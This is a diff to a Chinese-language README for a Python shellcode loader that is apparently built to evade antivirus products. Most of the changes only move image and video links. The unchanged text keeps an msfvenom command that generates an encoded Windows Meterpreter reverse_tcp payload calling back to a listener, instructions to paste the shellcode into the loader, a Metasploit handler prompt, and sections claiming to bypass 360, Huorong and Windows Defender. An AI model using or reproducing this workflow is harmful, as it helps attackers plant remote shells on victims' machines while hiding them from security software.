@@ -26,6 +26,7 @@ pyinstaller 4.7
 
 生成ShellCode
 
+
 ```
 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.100 lport=8080 --encrypt base64 -f c
 ```
@@ -34,6 +35,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.100 lport=8080 -
 
 ![image-20220508135022087](images/%E5%85%8D%E6%9D%80/image-20220508135022087.png)
 
+![image-20220508135022087](https://user-images.githubusercontent.com/34683107/167286509-b134001a-e463-495c-ab6b-78933050b14f.png)
 ## 加载器
 
 将生成的ShellCode 填至 Bypass_AV.py 里的 ShellCode = '''**ShellCode**''' 处
@@ -76,22 +78,22 @@ msf6 exploit(multi/handler) > run
 
 ### Bypass_360
 
-https://user-images.githubusercontent.com/34683107/167286045-fa57c2d8-2988-42c3-ae46-c39e35dde9af.mp4
+
+
+
 
 
 ### Bypass_火绒
 
 
-https://user-images.githubusercontent.com/34683107/167286060-1085a75a-3b7e-4cd7-a6f7-ac4c28fe3e33.mp4
 
 
 ### Bypass_Window Defender
 
 
-https://user-images.githubusercontent.com/34683107/167286066-c7324967-2f46-48ed-aaf4-4a219997ba55.mp4
 
 
 
 感谢阅读
+![Axx8](https://user-images.githubusercontent.com/34683107/167286522-4a5fb52c-f975-4ca1-ba6d-6333fd9ff046.jpg)
 
-![](images/%E5%85%8D%E6%9D%80/Axx8.jpg)
